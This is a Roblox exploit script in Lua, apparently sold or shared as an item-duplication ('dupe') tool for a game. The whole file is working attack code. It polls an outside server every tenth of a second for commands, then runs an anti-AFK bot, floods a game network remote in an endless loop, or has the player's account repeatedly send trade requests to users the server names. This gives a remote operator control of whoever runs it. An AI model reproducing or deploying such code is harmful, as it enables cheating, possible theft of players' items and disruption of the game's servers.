local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local httpRequest = request

local afkExecuted = false
local spamRunning = false
local traded = {}

local function afkScript()
	local gui = Instance.new("ScreenGui", game.CoreGui)
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local label = Instance.new("TextLabel", gui)
	label.Size = UDim2.new(0, 370, 0, 52)
	label.Position = UDim2.new(0.5, -185, 0.1, 0)
	label.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	label.Font = Enum.Font.SourceSansSemibold
	label.Text = "Anti AFK Script Active"
	label.TextColor3 = Color3.new(0, 1, 1)
	label.TextSize = 22

	local vu = game:GetService("VirtualUser")
	Players.LocalPlayer.Idled:Connect(function()
		vu:CaptureController()
		vu:ClickButton2(Vector2.new())
		label.Text = "AFK blocked!"
		task.wait(2)
		label.Text = "Anti AFK Script Active"
	end)
end

local function trade(user1, user2)
	if traded[user1 .. "|" .. user2] then return end
	traded[user1 .. "|" .. user2] = true

	local function handle(player)
		while player and player.Parent do
			local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Trading")
			if gui and not gui.TradingFrame.Visible then
				local args = {
					{
						{
							ReplicatedStorage.IdentifiersContainer.RF_34fa16d44fc3ec71f2df15808f9b2487cb975eb93bfb49d822bba4a38945600f_S.Value,
							"\186\236PA\206\203M\248\128\4^\144\13&r/",
							player
						}
					}
				}
				ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
			end
			task.wait(1)
		end
	end

	for _, name in ipairs({user1, user2}) do
		local p = Players:FindFirstChild(name)
		if p then
			handle(p)
		else
			Players.PlayerAdded:Connect(function(newP)
				if newP.Name == name then
					handle(newP)
				end
			end)
		end
	end
end

local function startSpam()
	if spamRunning then return end
	spamRunning = true
	spawn(function()
		local args = {
			{
				{
					ReplicatedStorage.IdentifiersContainer.RE_b7b5d6eaedcdabca20ea87f1fd2b6ffc73fa913b3c748d69f838fd767b5f1ee6.Value,
					"\255"
				}
			}
		}
		while task.wait() do
			ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
		end
	end)
end

local function fetchInfo()
	local success, result = pcall(function()
		return httpRequest({
			Url = "https://ttddupe.replit.app/info",
			Method = "GET",
			Headers = {["Content-Type"] = "application/json"}
		})
	end)

	if not success or not result or not result.Body then return end

	local ok, data = pcall(function()
		return HttpService:JSONDecode(result.Body)
	end)

	if not ok then return end

	if data.afk and not afkExecuted then
		afkExecuted = true
		afkScript()
	end

	if data.spam then
		startSpam()
	end

	if data.trade and data.trade.user1 and data.trade.user2 then
		trade(data.trade.user1, data.trade.user2)
	end
end

spawn(function()
	while task.wait(0.1) do
		pcall(fetchInfo)
	end
end)
